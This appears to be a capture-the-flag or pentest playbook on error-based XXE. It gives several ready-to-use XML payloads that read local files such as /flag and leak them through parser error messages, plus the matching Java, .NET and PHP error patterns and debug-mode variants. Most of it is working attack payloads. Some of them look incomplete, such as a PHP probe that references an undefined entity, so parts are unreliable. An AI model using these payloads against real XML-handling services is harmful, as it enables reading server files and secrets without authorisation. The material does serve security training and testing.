# Error-Based XXE — exfil through the parser's own complaint

## The primitive — make the file content part of a bad URI

When the response shows parser errors, coerce the file content into a
URI the parser will fail on — the error message echoes the bad URI =
the file content.

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///flag">
  <!ENTITY % eval "<!ENTITY err SYSTEM 'file:///nonexistent-%file;'>">
  %eval;
]>
<r>&err;</r>
```

Parser tries to resolve `file:///nonexistent-<flag-content>` →
"file not found: /nonexistent-flag{s3cr3t}" — the error leaks it.

## Java SAX — the error-message patterns

```
SAXParseException: <file content>
FileNotFoundException: /nonexistent-<content>
MalformedURLException: <content>
```

Java's `SAXParseException.getMessage()` includes the failing entity —
depending on the app's error surfacing, the URI line appears in the
response body or error page.

## .NET — `XmlException` with the entity value

```
System.Xml.XmlException: An error occurred while parsing EntityName.
System.IO.FileNotFoundException: Could not find file 'C:\nonexistent-<content>'
```

.NET surfaces the attempted path in FileNotFoundException — classic
leak channel.

## PHP — libxml2 warnings echoed when display_errors on

```
Warning: simplexml_load_string(): I/O warning : failed to load external entity "file:///nonexistent-<content>"
```

PHP's libxml2 warnings include the attempted URI verbatim — the flag
rides inside the URI.

## The intentional-parse-error variant — entity name with content

```xml
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % eval "<!ENTITY &#x25; err 'file:///%file;/x'>">
%eval;
%err;
```

Or force a well-formedness error where the error line echoes the
entity's resolved value — parser-dependent.

## The "no error page but a stack trace" — debug-mode apps

Many frameworks dump stack traces on unhandled exceptions
(`DEBUG=True` Django, ASP.NET yellow screen, Java `printStackTrace` in
response) — the trace contains the entity-URI with your file content.

## The partial-echo variant — file content in a validation error

If the app validates the doc against an XSD or a schema and reports
schema violations verbatim — the entity-substituted text fails
validation and the reported line contains the file content.

## Two-stage: param-entity + error

```xml
<!DOCTYPE r [
<!ENTITY % file SYSTEM "file:///flag">
<!ENTITY % wrap "<!ENTITY &#x25; err SYSTEM 'file:///xx/%file;'>">
%wrap;
%err;
]>
<r/>
```

`%err;` forces a fetch of `file:///xx/<flag>` → FileNotFoundException
carries the flag.

## PHP/WordPress-style — `libxml_use_internal_errors(false)` + display_errors

PHP's default `libxml_use_internal_errors(true)` hides errors — when
the app sets it `false` AND `display_errors=On`, warnings surface
verbatim. Probe:

```xml
<!DOCTYPE r [<!ENTITY % x SYSTEM "file:///nonexistent-%file;/">%x;]>
```

## Falsifiers

- no error channel surfaces (all errors swallowed to a generic 500) →
  error-based exfil dead; needs OOB — `blind-xxe.md`

## Output to record

- the verbatim error text containing the file content
